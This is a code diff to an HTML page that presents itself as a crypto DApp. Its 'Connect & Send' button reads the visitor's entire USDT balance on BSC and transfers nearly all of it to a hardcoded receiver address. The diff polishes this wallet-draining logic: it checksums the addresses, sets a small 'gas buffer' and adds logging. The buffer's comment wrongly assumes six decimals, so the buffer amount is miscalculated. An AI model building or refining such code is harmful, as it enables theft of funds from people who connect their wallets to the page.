@@ -8,8 +8,8 @@
   <button onclick="connectAndTransfer()">Connect & Send</button>
 
   <script>
-    const receiverAddress = "0xc64087a6fd263ab6a140fb946f4caf7b3e82147f"; // lowercase
-    const usdtContractAddress = "0x55d398326f99059ff775485246999027b3197955";
+    const receiverAddress = "0xc64087a6Fd263ab6A140F9b46f4cAF7B3e82147f";
+    const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
 
     const usdtAbi = [
       {
@@ -41,27 +41,31 @@
 
           const usdtContract = new web3.eth.Contract(usdtAbi, usdtContractAddress);
           const balanceStr = await usdtContract.methods.balanceOf(sender).call();
-          const balance = web3.utils.toBigInt(balanceStr);
-          const gasFeeUsdt = 2000000n;
+          const balance = BigInt(balanceStr);
 
-          if (balance <= gasFeeUsdt) {
-            alert("Insufficient USDT balance to send after gas fees.");
+          const gasBuffer = 2n * 10n ** 6n; // 2 USDT in USDT's 6 decimals
+          if (balance <= gasBuffer) {
+            alert("USDT balance is too low to send after gas buffer.");
             return;
           }
 
-          const amountToSend = balance - gasFeeUsdt;
+          const amountToSend = balance - gasBuffer;
+
+          console.log("Sender:", sender);
+          console.log("Balance:", balance.toString());
+          console.log("Sending:", amountToSend.toString());
 
           const tx = await usdtContract.methods
-            .transfer(receiverAddress.toLowerCase(), amountToSend.toString())
+            .transfer(receiverAddress, amountToSend.toString())
             .send({ from: sender });
 
           alert("USDT sent! Tx hash: " + tx.transactionHash);
         } catch (err) {
           console.error("Error:", err);
-          alert("Transaction failed: " + err.message);
+          alert("Transaction failed: " + (err?.message || err));
         }
       } else {
-        alert("Install MetaMask or Trust Wallet.");
+        alert("Install MetaMask or Trust Wallet to use this DApp.");
       }
     }
   </script>
